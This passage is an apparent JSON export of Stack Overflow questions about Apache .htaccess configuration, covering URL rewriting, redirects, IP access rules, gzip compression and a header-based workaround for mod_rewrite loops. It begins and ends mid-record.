I' getting:</p>\n\n<blockquote>\n  <p>Forbidden</p>\n  \n  <p>You don't have permission to access /new/products/ on this server.\n  Additionally, a 404 Not Found error was encountered while trying to\n  use an ErrorDocument to handle the request.</p>\n</blockquote>\n\n<p>Any ideas?</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12357587,"title":".htaccess RewriteCond small issue","body":"<p>thanks to @Ωmega, I almost completely resolved my former issue (details here <a href=\"http://stackoverflow.com/questions/12327059/htaccess-regular-expression-issue\">.htaccess regular expression issue</a>) and came to this solution :</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} ^(.*/|)(en|de|fr)(/|)$ [NC]\nRewriteCond %1%3index.php -f\nRewriteRule ^(.*/|)(en|de|fr)(/|)$ index.php?lang=$2 [NC,QSA,L]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} ^(.*/|)(en|de|fr)(/.*|)$ [NC]\n#RewriteCond $1$3.php -f\nRewriteRule ^(.*/|)(en|de|fr)(/.*|)$ $1$3.php?lang=$2 [NC,QSA,L]\n</code></pre>\n\n<p>Basically, these lines will rewrite anything in the form of <code>domain/language/sub/.../somepage</code> to <code>domain/sub/.../somepage.php?lang=language</code>. The first block is for urls in the form of <code>domain/language/</code>, with or without an ending <code>/</code> which is redirected to <code>index.php</code>.</p>\n\n<p>This works very well tho two small glitches remain which are :</p>\n\n<ol>\n<li><p>The 3rd line in the second block (I #commented it) just doesn't match, no matter what. The strange part is that it DOES work on the 4th line, ie my page actually displays fine. Does that mean the <code>-f</code> parameter is wrong here ?</p></li>\n<li><p>If I input any url ending with a <code>/</code> (second block only, it DOES work with the index file), my rewrite is broken ie outputs as <code>domain/language/sub/.../<b>somepage/.php</b></code> Is there any way to exclude a potential <code>/</code> in the inputed url with the regexp ?</p></li>\n</ol>\n\n<p>Thank you for your feedback !</p>\n"},{"tags":["php","regex",".htaccess","numbers","links"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12356223,"title":"How can I write a .htaccess redirect to find all numbers?","body":"<p>I'm trying to figure out a regular expression that will find some numbers in a URL and use them in the URL I redirect to.</p>\n\n<pre><code>Redirect 301 /page.php?id=95485666 http://test.com/profile/info/id/95485666\n</code></pre>\n\n<p>i was thinking maybe </p>\n\n<pre><code>Redirect 301 /page.php?id=([0-9]+) http://test.com/profile/info/id/$1\n</code></pre>\n\n<p>but it doesn't seem to work</p>\n\n<p>Also, if I do a 301 redirect, how long do i have to keep the code in the .htaccess file? when is Google gonna figure out that the new link is the good one?</p>\n"},{"tags":["regex",".htaccess","rewrite","expression"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":77,"score":0,"question_id":12327059,"title":".htaccess regular expression issue","body":"<p>I still have no answer about this so I'm posting it here.</p>\n\n<p>I want to match an url in the form of <code>root/language/sub/.../document</code> in a .htaccess file and then rewrite it as <code>root/sub/.../document.php?lang=language</code></p>\n\n<p>Im close to hit but it seems my regexp doesn't 'catch' the input url. Here it is :</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond ^[a-z]{2}.*$/%{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([a-z]{2})/(.*)$ $2.php?lang=$1\n</code></pre>\n\n<p>Can someone point me out what is wrong here ? I'm no expert in regexp nor apache rewrites.</p>\n\n<p>Tyvm</p>\n\n<p><strong>* EDIT *</strong></p>\n\n<p><code>root</code> stands for domain ie <code>mydomain.net</code></p>\n\n<p>Here are a few examples :</p>\n\n<p><code>mydomain.net/fr/contact</code></p>\n\n<p>should be rewriten to </p>\n\n<p><code>mydomain.net/contact.php?lang=fr</code></p>\n\n<p>and</p>\n\n<p><code>mydomain.net/en/articles/view</code></p>\n\n<p>should be rewriten</p>\n\n<p><code>mydomain.net/articles/view.php?lang=en</code></p>\n\n<p>etc...</p>\n"},{"tags":["apache",".htaccess","webserver","httpd.conf","zend-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12355767,"title":"apache server appends domain name after every trailing backslash","body":"<p>I have a rather strange problem that I am not sure how to fix it.</p>\n\n<p>I have a zend server installation which by default has a lot of things that nobody needs. Anywho, the Zend forum it's basically spam and nobody answer the questions, I guess it may be considered an Apache problem or misconfiguration, but maybe some Zend user already faced this issue.</p>\n\n<p>The issue is the following:</p>\n\n<p>When crawling the server, after each trailing backslash it shows the domain name appended. This creates a lot of issues (even with Google that either sees them as duplicates or as missing).</p>\n\n<p>So</p>\n\n<p>[http://www.mysite.com]</p>\n\n<p>after any backslash, even on domain, and I do not speak about a rewritten URL sequence, but real directories that should end in backslash and they do have index files) it become:</p>\n\n<p>[http://www.mysite.com/mysite.com]</p>\n\n<p>[http://www.mysite.com/directory/]\n[http://www.mysite.com/directory/mysite.com]\n...etc.</p>\n\n<p>This despite the fact that there is an index.php file inside the directory as it is, obviously, on main folder for the domain.</p>\n\n<p>I never encounter such anomaly. Does anybody has any idea why the server appends the domain to every trailing backslash?</p>\n\n<p>Thank you.</p>\n\n<p>PS: I encountered this problem on both Windows and Linux... if it helps... Configuration file out of the box, Zend CE and Zend Pro w/ PHP5.3.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12318285,"title":"order deny,allow not working in htaccess","body":"<p>I have rules working fine in .htaccess such as force https. But the following <em>deny,allow</em> just won't work.</p>\n\n<pre><code>order deny,allow\ndeny from all\nallow from xxx.xxx.xxx.xxx\n</code></pre>\n\n<p>Can the .conf overrule the htaccess?  What should I look out for?  Are there any modules that could be causing this? The .htaccess itself works, it's just the <em>deny,allow</em> section.</p>\n\n<p>The reason for this order is so that I can develop the non-live site without anyone seeing.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":12,"score":1,"question_id":12352550,"title":"Redirect URL alternatives with htaccess","body":"<p>I am able to redirect URL to another URL with htaccess by using the following directive:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/example$\nRewriteRule (.*) /pages/example [L,R=301]\n\nRewriteCond %{REQUEST_URI} ^/example\nRewriteRule (.*) /pages/example [L,R=301]\n</code></pre>\n\n<p>But I want to make this with a single directive in htaccess and this directive should cover all alternatives;</p>\n\n<pre><code>http://mydomain.com/example -&gt; http://mydomain.com/pages/example\nhttp://mydomain.com/example/ -&gt; http://mydomain.com/pages/example\nhttp://mydomain.com/example/test -&gt; http://mydomain.com/pages/example/test\n</code></pre>\n\n<p>How can I do this with a single .htaccess? Any thoughts?</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12344030,"title":"How to do these redirections using htaccess?","body":"<p>Two requirements... </p>\n\n<pre><code>domain.com/folder/file/\n</code></pre>\n\n<p>to</p>\n\n<pre><code>domain.com/folder/file.html\n</code></pre>\n\n<p>this one is slightly more complicated but i can live without it! </p>\n\n<pre><code>domain.com/folder/file/pagenumber/\n</code></pre>\n\n<p>to</p>\n\n<pre><code>domain.com/folder/file-pagenumber.html \n</code></pre>\n\n<p>Any suggestions would be welcome. Thanks! </p>\n"},{"tags":[".htaccess","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12352309,"title":"Redirect non SSL to error page with htaccess","body":"<p>I found several solutions to redirect non-SSL to SSL, but I don't want to do this for a specific purpose. Since it will still send the information unencrypted over the internet.</p>\n\n<p>I want to force the users to call SSL or else they can't use the page.</p>\n\n<p>So I need to redirect non-SSL to an error page (simple HTML). And if the page is accessed by SSL do nothing.</p>\n\n<p>Anyone have a good htaccess for this? Preferably CodeIgniter compatible.</p>\n"},{"tags":["ruby-on-rails-3","image",".htaccess","mod-rewrite","path"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12351984,"title":"Ruby on Rails - .htacces RewriteRule to change image path","body":"<h1>The situation</h1>\n\n<p>I use Carrierwave to upload images to the default upload/ directory. Works fine. When I want to view the images in the front end of my online web server, they don't show.</p>\n\n<p>If I use my application in my local setup, the images show.</p>\n\n<p>The only difference between my local and web server's setup is that on my server the application is run in subdirectory called \"/app\". Locally it's in the root directory.</p>\n\n<h1>What I have so far</h1>\n\n<p>I have this Redirect command in my .htaccess:</p>\n\n<pre><code>Redirect 301 /uploads/model/image/54/image.jpg /app/uploads/model/image/54/imgage.jpg\n</code></pre>\n\n<p>I want to formulate a general RewriteRule out of it so that all images which have the path \"/uploads/model/image/\" are found and redirected to \"/app/uploads/model/image/\".</p>\n\n<p>How can I do that? I've tried several RewriteRules like:</p>\n\n<pre><code>RedirectMatch 301 /uploads/(.*) /app/uploads/\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>Redirect 301 /uploads/model/image/(.*) /app/uploads/model/image//$1\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>RewriteRule ^.*/app/uploads/(.*)$ http://%{HTTP_HOST}/uploads/$1 [L,R=301]\n</code></pre>\n\n<h1>What I've read so far</h1>\n\n<p>I've read those entries on Stackoverflow:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/9700990/how-to-change-image-path-using-htaccess\">How to change image path using htaccess?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/2766443/use-mod-rewrite-to-rewrite-root-to-another-path?lq=1\">Use Mod_Rewrite to Rewrite ROOT to Another Path</a></li>\n<li><a href=\"http://stackoverflow.com/questions/990392/htaccess-rewrite-to-redirect-root-url-to-subdirectory/990405\">.htaccess rewrite to redirect root URL to subdirectory</a></li>\n</ul>\n\n<p>I really have no idea why this happens would be very happy to get any hint, tip or link that could help me out of that.</p>\n"},{"tags":[".htaccess","easyphp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":585,"score":0,"question_id":8158770,"title":"easyphp and .htaccess","body":"<p>I need help with EasyPHP and .htaccess .</p>\n\n<p>The .htaccess file doesn't working, I think its because I don't setup something with EasyPHP.</p>\n\n<p>My EasyPHP version is <strong>5.3.8.1</strong></p>\n\n<p>Maybe anyone knows how to fix this problem ?</p>\n\n<p>.htaccess file :</p>\n\n<p><code>Options +FollowSymlinks</code></p>\n\n<p><code>RewriteEngine on</code></p>\n\n<p><code>RewriteRule ^get/([^/]+) /func/get.php?link=$1 [NC]</code></p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12349471,"title":"301 redirects with regular expressions","body":"<p>I'm having some trouble using the right code for my .htaccess file.\nWhat I'm trying to accomplish is this: </p>\n\n<p>We have a QR code generator which generates random url'Ss like this:</p>\n\n<p><a href=\"http://mydomain.com?APP-V2/7091c104-32a8-4680-9c07-a75c3ee61d7a/00\" rel=\"nofollow\">http://mydomain.com?APP-V2/7091c104-32a8-4680-9c07-a75c3ee61d7a/00</a></p>\n\n<p>I need to redirect all these url's to the homepage, <a href=\"http://mydomain.com\" rel=\"nofollow\">http://mydomain.com</a>.\nHow to I write the wildcard in my htaccess file? Basically everything after mydomain.com?APP-V2/ should be redirected.</p>\n\n<p>Any help much appreciated!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":11203879,"title":"Configure htaccess to load static pages","body":"<p>Im working on a server with the following htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule .* index.php\nRewriteRule  ^[^/]*\\.html$ index.php\nRewriteRule ^/(typo3|typo3temp|typo3conf|t3lib|tslib|fileadmin|uploads|showpic\\.php)/ - [L]\nRewriteRule ^/(typo3|typo3temp|typo3conf|t3lib|tslib|fileadmin|uploads|showpic\\.php)/.*$ - [L]\n</code></pre>\n\n<p>Now they asked me to prepare a static page inside their server, lets call it <a href=\"http://www.myserver.com/mystaticpage.html\" rel=\"nofollow\">http://www.myserver.com/mystaticpage.html</a></p>\n\n<p>The problem is that when i try to access that url, it redirects to index.php. How could I alter the htacces file to address this problem without messing anything with the installed CMS?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":19,"score":0,"question_id":12347056,"title":"Htaccess rule doesnt work","body":"<p>I have got this rule.. which I put as my first rule</p>\n\n<pre><code>RewriteRule ^categories_compare/$ index.php?app_table_comparison=3 [L]\n</code></pre>\n\n<p>This is the url that I type:</p>\n\n<pre><code>http://apps.com/categories_compare\n</code></pre>\n\n<p>The problem is that it doesnt do the redirect.. why is that?</p>\n\n<p>This is part of my htaccess:</p>\n\n<pre><code>RewriteRule ^news2/([^/\\.]+).(html)$ index.php?news_url_two=$1 [L]\nRewriteRule ^news/([^/\\.]+).(html)$ index.php?news_url=$1 [L]\nRewriteRule ^categories_compare/?$ index.php?app_table_comparison=3 [L]\n</code></pre>\n\n<p>I want the last rule to work.</p>\n"},{"tags":["css",".htaccess","compression","gzip","zlib"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12331110,"title":"GZIP CSS completely breaks page","body":"<p>Thanks for stopping by. I really tried this on my own, but once again it seems too much for me to handle.<br><br></p>\n\n<p><h2>THE SITUATION...</h2><hr>\nI'm live with my own website <a href=\"http://www.marianarlt.de\" rel=\"nofollow\">http://www.marianarlt.de</a> on a shared hoster. When I came to the point of wanting to compress my tons of cms-generated js and css to make PageSpeedInsights and myself happy, I read into it and at last found out that <strong>my hoster doesn't have neither mod_gzip nor mod_deflate installed</strong>. What is installed is ZLIB. So I searched. Found the typical php append solution and didn't like it. Found a few neat lines of code for htaccess which made me happy cause they worked right away:</p>\n\n<pre><code>AddHandler application/x-httpd-php .html .htm .php .js\nphp_flag output_buffering On\nphp_value output_handler ob_gzhandler\nphp_flag zlib.output_compression Off\n</code></pre>\n\n<p>I confirmed it's working by using <a href=\"http://www.gidnetwork.com/tools/gzip-test.php\" rel=\"nofollow\" title=\"Online GZIP compression test\">GIDZipTest</a>. This is all fine and I love it.<br><br><strong>But as soon as I put .css to the AddHandler List, my page completely breaks.</strong><br>I tried to use the <a href=\"http://viralpatel.net/blogs/compress-php-css-js-javascript-optimize-website-performance/\" rel=\"nofollow\" title=\"conditional php compression\">php solution with ob_gzhandler</a> for only css files, but it ended up not working at all. Just does plain nothing.<br><br><br></p>\n\n<p><h2>WORKAROUND? (NOT REALLY)</h2><hr>\nI manually minified all the css and uploaded a css.gz version of each file, serving it with</p>\n\n<pre><code>RewriteCond %{HTTP:Accept-encoding} gzip\nRewriteCond %{REQUEST_FILENAME}\\.gz -s\nRewriteRule ^(.*)\\.css $1\\.css\\.gz [QSA]\nRewriteRule \\.css\\.gz$ - [T=text/css,E=no-gzip:1]\n</code></pre>\n\n<p>This works fine as well.<br><br><br>\n<h2>QUESTIONS!</h2><hr>\n<ol>\n<li>What do I need to define/specifiy for css compression to work? I feel I'm just missing some conversion stuff...</li><br>\n<li>When I'm serving my manually minified .css.gz files to a client, will they still be compressed extra?</li><br>\n<li>Would this have any further advantages in filesize or should I rather just stick to the manually served versions and give a ** about Google PageSpeed?<br>(GIDZipTest still shows «what if» scenarios even for the minified files, which are impressive numbers to be honest. I'd like that...)</li>\n</ol><br></p>\n\n<p>Thank you in advance for any comment given.<br>\nYours sincerely<br></p>\n\n<p>Marian</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12346458,"title":"wordpress custom dashboard url with htaccess","body":"<p>Any body have idea about the following scenario</p>\n\n<p>I have a domain example.com which is installed wordpress and successfully running.\n And , the user should be able to wordpress dashboard with the username like  <a href=\"http://example.com/username\" rel=\"nofollow\">http://example.com/username</a> also browser should display this url. dont change url to <a href=\"http://example.com/wp-admin/profile.php\" rel=\"nofollow\">http://example.com/wp-admin/profile.php</a></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12341182,"title":"How can I avoid this error with mod_rewrite?","body":"<p>I have a site running on XAMPP on Windows. The root of the site is at localhost/sitename/.</p>\n\n<p>I've used .htaccess with mod_rewrite to make index.php?app=appname appear at either sitename/appname/ or sitename/appname.</p>\n\n<p>When I access an app through sitename/appname (without trailing slash), everything is fine. The browser finds my images and css at sitename/assets/.., as they are found relative to the current page.</p>\n\n<p>The problem is, when I access an app through sitename/appname/ (with trailing slash), the browser cannot find my assets folder, as it is now trying to look in sitename/appname/assets/.</p>\n\n<p>Without mod rewriting the assets folder, what can I do to fix this?</p>\n"},{"tags":["apache",".htaccess","google-index"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12346549,"title":"google search results are 403 forbidden pages","body":"<p>I have a website, say site.com. But contents for this website is in another domain, say allsites.com/site. Redirections are happening using htaccess files. I have set up 301 redirection for redirecting from allsites.com/site to site.com.\nIssue is when i queried like site:site.com in Google Search,its listing all crawled pages.But when i click on any of the link, its a 403 Forbidden Error. But other ways that link is working perfectly....I am also attaching the htaccess file.plz do the needful</p>\n\n<pre><code>php_flag display_errors Off\nphp_value memory_limit 128M\n\n##\n# @version $Id: htaccess.txt 9975 2008-01-30 17:02:11Z ircmaxell $\n# @package Joomla\n# @copyright Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.\n# @license http://www.gnu.org/copyleft/gpl.html GNU/GPL\n# Joomla! is Free Software\n##\n\n\n#####################################################\n#  READ THIS COMPLETELY IF YOU CHOOSE TO USE THIS FILE\n#\n# The line just below this section: 'Options +FollowSymLinks' may cause problems\n# with some server configurations.  It is required for use of mod_rewrite, but may already\n# be set by your server administrator in a way that dissallows changing it in\n# your .htaccess file.  If using it causes your server to error out, comment it out (add # to\n# beginning of line), reload your site in your browser and test your sef url's.  If they work,\n# it has been set by your server administrator and you do not need it set here.\n#\n#####################################################\n\n##  Can be commented out if causes errors, see notes above.\nOptions +FollowSymLinks\n\n#\n#  mod_rewrite in use\n\nRewriteEngine On\n\n\n\n#  Uncomment following line if your webserver's URL\n#  is not directly related to physical file paths.\n#  Update Your Joomla! Directory (just / for root)\n\n# RewriteBase /\n\n########## Begin - Joomla! core SEF Section\n#\n#RewriteCond %{REQUEST_FILENAME} !-f\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteCond %{REQUEST_URI} !^/index.php\n#RewriteCond %{REQUEST_URI} (/|\\.php|\\.html|\\.htm|\\.feed|\\.pdf|\\.raw|/[^.]*)$  [NC]\n#RewriteRule (.*) index.php\n#RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]\n#\n########## End - Joomla! core SEF Section\n\n########## Begin - 3rd Party SEF Section\n\nRewriteCond %{REQUEST_URI} ^(/component/option,com) [NC,OR] ##optional - see notes##\nRewriteCond %{REQUEST_URI} (/|\\.htm|\\.php|\\.html|/[^.]*)$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule (.*) index.php\n#\n########## End - 3rd Party SEF Section\n\n########## Begin - Rewrite rules to block out some common exploits\n## If you experience problems on your site block out the operations listed below\n## This attempts to block the most common type of exploit `attempts` to Joomla!\n#\n# Block out any script trying to set a mosConfig value through the URL\nRewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\\%3D) [OR]\n# Block out any script trying to base64_encode crap to send via URL\nRewriteCond %{QUERY_STRING} base64_encode.*\\(.*\\) [OR]\n# Block out any script that includes a &lt;script&gt; tag in URL\nRewriteCond %{QUERY_STRING} (\\&lt;|%3C).*script.*(\\&gt;|%3E) [NC,OR]\n# Block out any script trying to set a PHP GLOBALS variable via URL\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\n# Block out any script trying to modify a _REQUEST variable via URL\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\n# Send all blocked request to homepage with 403 Forbidden error!\nRewriteRule ^(.*)$ index.php [F,L]\n########## End - Rewrite rules to block out some common exploits\n#\n# Begin - Domain blocking\nRewriteCond %{HTTP_REFERER}^http(s)?://([^.]+\\.).amat.com.*$ [NC]\nRewriteRule .* - [F]\n# End - Domain blocking\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12312624,"title":"htaccess auth and deny together","body":"<p>I want to deny all request to the server except some ip's , but those ip's should show the auth dialog. What I have tried is</p>\n\n<pre><code>order deny,allow\ndeny from all\nallow from xxx.xxx.xx.xxx\nallow from xxx.xxx.xx.xxx\nAuthUserFile /path/to/.htpasswd\nAuthType Basic\nAuthName \"Login Required\"\nRequire valid-user\n</code></pre>\n\n<p>It works fine , but after user login it showing Internal server error(500). Any idea ?</p>\n"},{"tags":["apache",".htaccess","development-environment"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":168,"score":0,"question_id":9594022,"title":"Single htaccess file with distinction between production and development","body":"<p>I am currently using two .htaccess files for my website: one is the development version, and the other one is the production version. The difference is in absolute and some relative paths that are used for <code>RedirectMatch</code>, <code>RewriteRule</code>, and <code>ErrorDocument</code> directives, and that differ between development and production. I am using a git hook to remove the dev version and rename the production version, but this still means I have to maintain two versions of basically the same file. Also, I am encountering similar problems with other sites I manage, so this all means more work. I rather have one single file and some sort of condition in the .htaccess file that allows me to say <code>if production -&gt; use these, else -&gt; use these</code>. Can I do such thing in an .htaccess file? </p>\n\n<p>I have found this:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/6764237/htaccess-between-developemt-staging-and-production\">.htaccess between developemt, staging, and production</a></p>\n\n<p>But this is for rewrite rules and would not fix the different ErrorDocument paths. </p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12345169,"title":"R=301 from domain.tld/index.php?id=1 to domain.tld","body":"<p>I have this. This is not changing <code>domain.tld/index.php?id=1</code> to <code>domain.tld</code> in browser address bar. How to make rule that will work correctly making permanent 301 redirect?</p>\n\n<pre><code>RewriteRule ^domain.tld$ domain.tld/index.php?id=1 [NC,R=301,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12344831,"title":"Strip query_string","body":"<p>I want to get rid of some query string on my whole website (explicitly facebook shared/like query which usually begin with fb_action).</p>\n\n<p>I thought about using .htaccess to do that.</p>\n\n<p>I want this: \nLink 1) </p>\n\n<pre><code>http://example.com/documents/de_desmarais_en_sirois?fb_action_ids=10151430962018298&amp;fb_action_types=og.likes&amp;fb_source=timeline_og&amp;action_object_map={%2210151430962018298%22%3A157643874359578}&amp;action_type_map={%2210151430962018298%22%3A%22og.likes%22}&amp;action_ref_map=[]\n</code></pre>\n\n<p>to look like:\nLink 2)</p>\n\n<pre><code>http://example.com/documents/de_desmarais_en_sirois\n</code></pre>\n\n<p>In my .htaccess, I added: </p>\n\n<pre><code>RewriteCond %{QUERY_STRING} fb_action\nRewriteRule ^(.*) /$1? [R=301,L]\n</code></pre>\n\n<p>But, when I go on the original link, I am directed to my root folder example.com/pages.php, but I want to keep the first part of the URL which is <code>example.com/documents/de_desmarais_en_sirois</code>. I don't want to go to my root.</p>\n\n<p>What should I modify/do?</p>\n"},{"tags":[".htaccess","magento"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12345040,"title":"magento .htaccess password protect inner pages (not homepage)","body":"<p>I would like to use .htaccess to password protect all inner pages of Magento, except the home page. e.g. \n<a href=\"http://www.example.com/abc\" rel=\"nofollow\">http://www.example.com/abc</a> (password protect)\n<a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a> (home page, no need to password protect)</p>\n\n<p>I tried to use the <code>setifenv request_uri = \"/\" =&gt; allow</code>, but didn't work. It still password protect all pages including the homepage.\nI also tried a few ways inside the Magento admin URL rewrite, but those won't work either.</p>\n\n<p>Any expert can help? thx</p>\n\n<p>E</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12340187,"title":"Setting subfolder as root using .htaccess and keeping link to other subdir working","body":"<p>I'm trying to set a subfolder of my website as root:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/home/.*$\nRewriteRule ^(.*)$ /home/$1 [QSA,L]\n</code></pre>\n\n<p>This works fine when I go to <a href=\"http://www.mydomain.com/\" rel=\"nofollow\">http://www.mydomain.com/</a> it shows the content of <a href=\"http://www.mydomain.com/home\" rel=\"nofollow\">http://www.mydomain.com/home</a> but I get a file not found error when I try to go to, for instance, <a href=\"http://www.mydomain.com/anothersub\" rel=\"nofollow\">http://www.mydomain.com/anothersub</a>.</p>\n\n<p>Suggestions?</p>\n"},{"tags":[".htaccess","mod-rewrite","loops","redirect"],"answer_count":2,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":580,"score":6,"question_id":7798099,"title":"How to block multiple mod_rewrite passes (or infinite loops) in a .htaccess context","body":"<p>I'm working on a website running on a shared Apache v2.2 server, so all configuration is via .htaccess files, and I wanted to use mod_rewrite to map URLs to the filesystem in less-than-completely-straightforward way.  Just for example's sake, let's say that what I wanted to do was this:</p>\n\n<ul>\n<li>Map URL <code>www.mysite.com/Alice</code> to filesystem folder <code>/public_html/Bob</code></li>\n<li>Map URL <code>www.mysite.com/Bob</code> to filesystem folder <code>/public_html/Alice</code></li>\n</ul>\n\n<p>Now, after several hours work carefully designing the ruleset (the real one, not the Alice/Bob one!) I put all my carefully crafted rewriting rules in a .htaccess file in /public_html, and tested it out ...only to get a 500 server error!</p>\n\n<p>I'd been caught out by a well documented \"gotcha!\" in Apache:  When mod_rewrite rules are used inside a .htaccess file, a re-written URL is <em>re-submitted</em> for another round of processing (as if it were an external request).  That happens so that any rules in the target folder of the re-written request can be applied, but it can result in some very counter-intuitive behaviour by the webserver!</p>\n\n<p>In the above example, that means that a request for <code>www.mysite.com/Alice/foo.html</code> gets rewritten to <code>/Bob/foo.html</code>, and then resubmitted (internally) to the server as a request for <code>www.mysite.com/Bob/foo.html</code>.  This is then re-rewritten back to <code>/Alice/foo.html</code> and resubmitted, which causes it to get re-re-rewritten to <code>/Bob/foo.html</code>, and so on; an infinite loop ensues... broken only by a server timeout error.</p>\n\n<hr>\n\n<h2>The question is, how to ensure that a .htaccess mod_rewrite ruleset only gets applied ONCE?</h2>\n\n<hr>\n\n<p>The [L] flag in a RewriteRule stops all further rewriting <em>during a single pass through the ruleset</em>, but <em>doesn't</em> stop the entire ruleset from being re-applied after the re-written URL is resubmitted to the server.  According to the documentation, Apache v2.3.9+ (currently in Beta) contains an [END] flag that provides precisely this functionality.  Unfortunately, the web host is still using Apache 2.2, and they declined my polite request to upgrade to the beta version!</p>\n\n<p>What's needed is a workaround that provides similar functionality to the [END] flag.  My first thought was that I could use an environment variable:  Set a flag during the first rewriting pass that would tell subsequent passes to do no further rewriting.  If I called my flag variable 'END', the code might look like this:</p>\n\n<pre><code>#  Prevent further rewriting if 'END' is flagged\nRewriteCond %{ENV:END} =1\nRewriteRule .* - [L]\n\n#  Map /Alice to /Bob, and /Bob to /Alice, and flag 'END' when done\nRewriteRule ^Alice(/.*)?$ Bob$1 [L,E=END:1]\nRewriteRule ^Bob(/.*)?$ Alice$1 [L,E=END:1]\n</code></pre>\n\n<p>Unforunately this code doesn't work:  After a bit of experimentation, I discovered that environment variables don't survive the process of re-submitting the rewritten URL to the server.  The last line on <a href=\"http://httpd.apache.org/docs/2.3/rewrite/advanced.html#setenvvars\" rel=\"nofollow\">this Apache documentation page</a> suggests that environment variables <em>ought</em> to survive internal redirects, but I found that not to be the case.</p>\n\n<p>Still, the general idea can be salvaged.  After many hours of hair-pulling, and some advice from a colleague, I realised that HTTP request headers <em>are</em> preserved across internal redirects, so if I could store my flag in one of those, it might work!</p>\n\n<hr>\n\n<h2>Here's my solution:</h2>\n\n<hr>\n\n<pre><code># This header flags that there's no more rewriting to be done.\n# It's a kludge until use of the END flag becomes possible in Apache v2.3.9+\n# ######## REMOVE this directive for Apache 2.3.9+, and change all [...,L,E=END:1]\n# ######## to just [...,END] in all the rules below!\n\nRequestHeader set SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj 1 env=END\n\n\n# If our special end-of-rewriting header is set this rule blocks all further rewrites.\n# ######## REMOVE this directive for Apache 2.3.9+, and change all [...,L,E=END:1]\n# ######## to just [...,END] in all the rules below!\n\nRewriteCond %{HTTP:SPECIAL-HEADER-STOP-FURTHER-REWRITES-kjhsdf87653vasj} =1 [NV]\nRewriteRule .* - [L]\n\n\n#  Map /Alice to /Bob, and /Bob to /Alice, and flag 'END' when done\n\nRewriteRule ^Alice(/.*)?$ Bob$1 